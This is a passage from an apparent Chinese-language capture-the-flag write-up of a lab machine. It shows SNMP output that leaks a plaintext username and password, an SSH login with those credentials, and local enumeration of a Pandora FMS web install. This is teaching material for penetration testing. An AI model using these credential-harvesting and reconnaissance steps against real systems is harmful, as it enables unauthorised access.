class="hljs-string">&quot;/bin/sh&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.856 = STRING: <span class="hljs-string">&quot;/usr/sbin/atd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.860 = STRING: <span class="hljs-string">&quot;/usr/sbin/snmpd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.864 = STRING: <span class="hljs-string">&quot;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.937 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.940 = STRING: <span class="hljs-string">&quot;/usr/lib/policykit-1/polkitd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.951 = STRING: <span class="hljs-string">&quot;/sbin/agetty&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.982 = STRING: <span class="hljs-string">&quot;/usr/sbin/mysqld&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.1112 = STRING: <span class="hljs-string">&quot;/usr/bin/host_check&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.1389 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2055 = STRING: <span class="hljs-string">&quot;/usr/libexec/fwupd/fwupd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2063 = STRING: <span class="hljs-string">&quot;/usr/lib/upower/upowerd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2188 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2270 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2311 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2353 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2365 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2373 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2384 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2458 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2481 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2519 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.2520 = STRING: <span class="hljs-string">&quot;/usr/sbin/apache2&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.758 = STRING: <span class="hljs-string">&quot;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.779 = STRING: <span class="hljs-string">&quot;--foreground&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.780 = STRING: <span class="hljs-string">&quot;/usr/bin/networkd-dispatcher --run-startup-triggers&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.781 = STRING: <span class="hljs-string">&quot;-n -iNONE&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.789 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.790 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.828 = STRING: <span class="hljs-string">&quot;-f&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.832 = STRING: <span class="hljs-string">&quot;-f&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.847 = STRING: <span class="hljs-string">&quot;-c sleep 30; /bin/bash -c &#x27;/usr/bin/host_check -u daniel -p HotelBabylon23&#x27;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.856 = STRING: <span class="hljs-string">&quot;-f&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: <span class="hljs-string">&quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.864 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.937 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.940 = STRING: <span class="hljs-string">&quot;--no-debug&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.951 = STRING: <span class="hljs-string">&quot;-o -p -- \\u --noclear tty1 linux&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.982 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.1112 = STRING: <span class="hljs-string">&quot;-u daniel -p HotelBabylon23&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.1389 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2055 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2063 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2188 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2270 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2311 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2353 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2365 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2373 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2384 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2458 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2481 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2519 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.5.2520 = STRING: <span class="hljs-string">&quot;-k start&quot;</span><br></code></pre></td></tr></table></figure>

<p>11、这里我们获取到了一个账号密码信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">STRING: <span class="hljs-string">&quot;-u daniel -p HotelBabylon23&quot;</span><br></code></pre></td></tr></table></figure>

<p>12、我们使用获取到的信息进行登录系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh daniel@10.10.11.136                     <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.136 (10.10.11.136)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.136<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">daniel@10.10.11.136&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Wed 27 Dec 03:13:17 UTC 2023<br><br>  System load:           0.0<br>  Usage of /:            63.1% of 4.87GB<br>  Memory usage:          9%<br>  Swap usage:            0%<br>  Processes:             236<br>  Users logged <span class="hljs-keyword">in</span>:       0<br>  IPv4 address <span class="hljs-keyword">for</span> eth0: 10.10.11.136<br>  IPv6 address <span class="hljs-keyword">for</span> eth0: dead:beef::250:56ff:feb9:af3<br><br>  =&gt; /boot is using 91.8% of 219MB<br><br>0 updates can be applied immediately.<br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>daniel@pandora:~$ <span class="hljs-built_in">id</span><br>uid=1001(daniel) gid=1001(daniel) <span class="hljs-built_in">groups</span>=1001(daniel)<br>daniel@pandora:~$ <span class="hljs-built_in">pwd</span><br>/home/daniel<br>daniel@pandora:~$ <span class="hljs-built_in">ls</span><br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root   root   4096 Dec  7  2021 .<br>drwxr-xr-x 18 root   root   4096 Dec  7  2021 ..<br>drwxr-xr-x  4 daniel daniel 4096 Dec 27 03:13 daniel<br>drwxr-xr-x  2 matt   matt   4096 Dec  7  2021 matt<br>daniel@pandora:~$ <br></code></pre></td></tr></table></figure>

<p>13、但是可以发现，第一个flag信息，并不在这个用户下的。</p>
<p>14、以下是我一系列的信息枚举过程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br></pre></td><td class="code"><pre><code class="hljs bash">daniel@pandora:~$ ss -lt<br>State             Recv-Q            Send-Q                       Local Address:Port                         Peer Address:Port           Process            <br>LISTEN            0                 4096                         127.0.0.53%lo:domain                            0.0.0.0:*                                 <br>LISTEN            0                 128                                0.0.0.0:ssh                               0.0.0.0:*                                 <br>LISTEN            0                 80                               127.0.0.1:mysql                             0.0.0.0:*                                 <br>LISTEN            0                 511                                      *:http                                    *:*                                 <br>LISTEN            0                 128                                   [::]:ssh                                  [::]:*                                 <br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -lah /var/www/<br>total 16K<br>drwxr-xr-x  4 root root 4.0K Dec  7  2021 .<br>drwxr-xr-x 14 root root 4.0K Dec  7  2021 ..<br>drwxr-xr-x  3 root root 4.0K Dec  7  2021 html<br>drwxr-xr-x  3 matt matt 4.0K Dec  7  2021 pandora<br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -la /var/www/html<br>total 48<br>drwxr-xr-x 3 root root  4096 Dec  7  2021 .<br>drwxr-xr-x 4 root root  4096 Dec  7  2021 ..<br>drwxr-xr-x 7 root root  4096 Dec  7  2021 assets<br>-rw-r--r-- 1 root root 33560 Dec  3  2021 index.html<br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -la /var/www/pandora<br>total 16<br>drwxr-xr-x  3 matt matt 4096 Dec  7  2021 .<br>drwxr-xr-x  4 root root 4096 Dec  7  2021 ..<br>-rw-r--r--  1 matt matt   63 Jun 11  2021 index.html<br>drwxr-xr-x 16 matt matt 4096 Dec  7  2021 pandora_console<br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -la /var/www/pandora/pandora_console/<br>total 1596<br>drwxr-xr-x 16 matt matt    4096 Dec  7  2021 .<br>drwxr-xr-x  3 matt matt    4096 Dec  7  2021 ..<br>-rw-r--r--  1 matt matt    3746 Jan  3  2020 ajax.php<br>drwxr-xr-x  6 matt matt    4096 Dec  7  2021 attachment<br>-rw-r--r--  1 matt matt    1175 Jun 17  2021 audit.log<br>-rw-r--r--  1 matt matt     534 Jan  3  2020 AUTHORS<br>-rw-r--r--  1 matt matt     585 Jan  3  2020 composer.json<br>-rw-r--r--  1 matt matt   16003 Jan  3  2020 composer.lock<br>-rw-r--r--  1 matt matt   14875 May 17  2019 COPYING<br>-rw-r--r--  1 matt matt     506 Jan  3  2020 DB_Dockerfile<br>drwxr-xr-x  2 matt matt    4096 Dec  7  2021 DEBIAN<br>-rw-r--r--  1 matt matt    3366 Jan  3  2020 docker_entrypoint.sh<br>-rw-r--r--  1 matt matt    1263 Jan  3  2020 Dockerfile<br>drwxr-xr-x 11 matt matt    4096 Dec  7  2021 extensions<br>drwxr-xr-x  4 matt matt    4096 Dec  7  2021 extras<br>drwxr-xr-x  2 matt matt    4096 Dec  7  2021 fonts<br>drwxr-xr-x  5 matt matt    4096 Dec  7  2021 general<br>drwxr-xr-x 20 matt matt    4096 Dec  7  2021 godmode<br>drwxr-xr-x 21 matt matt   36864 Dec  7  2021 images<br>drwxr-xr-x 21 matt matt    4096 Dec  7  2021 include<br>-rw-r--r--  1 matt matt   52704 Dec  2  2021 index.php<br>-rw-r--r--  1 matt matt   42398 Jan  3  2020 install.done<br>drwxr-xr-x  5 matt matt    4096 Dec  7  2021 mobile<br>drwxr-xr-x 15 matt matt    4096 Dec  7  2021 operation<br>-rw-r--r--  1 matt matt    1302 Dec 27 01:06 pandora_console.log<br>-rw-r--r--  1 matt matt     234 May 17  2019 pandora_console_logrotate_centos<br>-rw-r--r--  1 matt matt     171 May 17  2019 pandora_console_logrotate_suse<br>-rw-r--r--  1 matt matt     222 May 17  2019 pandora_console_logrotate_ubuntu<br>-rw-r--r--  1 matt matt    4883 May 17  2019 pandora_console_upgrade<br>-rw-r--r--  1 matt matt 1168598 Jan  3  2020 pandoradb_data.sql<br>-rw-r--r--  1 matt matt  160283 Jan  3  2020 pandoradb.sql<br>-rw-r--r--  1 matt matt     476 Jan  3  2020 pandora_websocket_engine.service<br>drwxr-xr-x  3 matt matt    4096 Dec  7  2021 tests<br>drwxr-xr-x  2 matt matt    4096 Dec  7  2021 tools<br>drwxr-xr-x 11 matt matt    4096 Dec  7  2021 vendor<br>-rw-r--r--  1 matt matt    4856 Jan  3  2020 ws.php<br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /var/www/pandora/pandora_console/DB_Dockerfile<br>FROM mysql:5.5<br>MAINTAINER Pandora FMS Team &lt;info@pandorafms.com&gt;<br><br>WORKDIR /pandorafms/pandora_console<br><br>ADD pandoradb.sql /docker-entrypoint-initdb.d<br>ADD pandoradb_data.sql /docker-entrypoint-initdb.d<br>RUN <span class="hljs-built_in">chown</span> mysql /docker-entrypoint-initdb.d<br><br>ENV MYSQL_DATABASE=pandora<br><br>RUN <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; \n\</span><br><span class="hljs-string">sed -i \&quot;1iUSE \$MYSQL_DATABASE\&quot; /docker-entrypoint-initdb.d/pandoradb.sql \n\</span><br><span class="hljs-string">sed -i \&quot;1iUSE \$MYSQL_DATABASE\&quot; /docker-entrypoint-initdb.d/pandoradb_data.sql \n\</span><br><span class="hljs-string">&quot;</span> &gt;&gt; /docker-entrypoint-initdb.d/create_pandoradb.sh<br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /var/www/pandora/pandora_console/Dockerfile<br>FROM centos:centos6<br>MAINTAINER Pandora FMS Team &lt;info@pandorafms.com&gt;<br><br>RUN &#123; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[EPEL]&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;name = CentOS Epel&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;baseurl = http://dl.fedoraproject.org/pub/epel/6/x86_64&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;enabled=1&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;gpgcheck=0&#x27;</span>; \<br>&#125; &gt; /etc/yum.repos.d/extra_repos.repo<br><br>RUN &#123; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[artica_pandorafms]&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;name=CentOS6 - PandoraFMS official repo&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;baseurl=http://artica.es/centos6&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;gpgcheck=0&#x27;</span>; \<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;enabled=1&#x27;</span>; \<br>&#125; &gt; /etc/yum.repos.d/pandorafms.repo<br><br>RUN yum -y update; yum clean all;<br>RUN yum install -y \ <br>        git \<br>        httpd \<br>        cronie \<br>        ntp \<br>        openldap \<br>        nfdump \<br>        wget \<br>        curl \<br>        openldap \<br>        plymouth \<br>        xterm \<br>        php \ <br>        php-gd \ <br>        graphviz \ <br>        php-mysql \ <br>        php-pear-DB \ <br>        php-pear \<br>        php-pdo \<br>        php-mbstring \ <br>        php-ldap \ <br>        php-snmp \ <br>        php-ldap \ <br>        php-common \ <br>        php-zip \ <br>        nmap \<br>        net-snmp-utils \<br>        mod_ssl \<br>        xprobe2<br><br><span class="hljs-comment">#Clone the repo</span><br>RUN git <span class="hljs-built_in">clone</span> -b develop https://github.com/pandorafms/pandorafms.git /tmp/pandorafms<br><br><span class="hljs-comment">#Exposing ports for: HTTP, SNMP Traps, Tentacle protocol</span><br>EXPOSE 80 162/udp 443 41121<br><br><span class="hljs-comment"># Simple startup script to avoid some issues observed with container restart</span><br>ADD docker_entrypoint.sh /entrypoint.sh<br>RUN <span class="hljs-built_in">chmod</span> -v +x /entrypoint.sh<br><br>CMD [<span class="hljs-string">&quot;/entrypoint.sh&quot;</span>]<br><br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /var/www/pandora/pandora_console/docker_entrypoint.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -e<br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$MYSQL_PORT_3306_TCP</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PANDORA_DB_HOST</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>                        PANDORA_DB_HOST=<span class="hljs-string">&#x27;mysql&#x27;</span><br>                <span class="hljs-keyword">else</span><br>                        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;warning: both PANDORA_DB_HOST and MYSQL_PORT_3306_TCP found&#x27;</span><br>                        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&quot;  Connecting to PANDORA_DB_HOST (<span class="hljs-variable">$PANDORA_DB_HOST</span>)&quot;</span><br>                        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;  instead of the linked mysql container&#x27;</span><br>                <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PANDORA_DB_HOST</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;error: missing PANDORA_DB_HOST and MYSQL_PORT_3306_TCP environment variables&#x27;</span><br>        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;  Did you forget to --link some_mysql_container:mysql or set an external db&#x27;</span><br>        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;  with -e PANDORA_DB_HOST=hostname:port?&#x27;</span><br>        <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># if we&#x27;re linked to MySQL and thus have credentials already, let&#x27;s use them</span><br>: <span class="hljs-variable">$&#123;PANDORA_DB_USER:=<span class="hljs-variable">$&#123;MYSQL_ENV_MYSQL_USER:-root&#125;</span>&#125;</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$PANDORA_DB_USER</span>&quot;</span> = <span class="hljs-string">&#x27;root&#x27;</span> ]; <span class="hljs-keyword">then</span><br>        : <span class="hljs-variable">$&#123;PANDORA_DB_PASSWORD:=$MYSQL_ENV_MYSQL_ROOT_PASSWORD&#125;</span><br><span class="hljs-keyword">fi</span><br>: <span class="hljs-variable">$&#123;PANDORA_DB_PASSWORD:=$MYSQL_ENV_MYSQL_PASSWORD&#125;</span><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PANDORA_DB_NAME</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        : <span class="hljs-variable">$&#123;PANDORA_DB_NAME:=<span 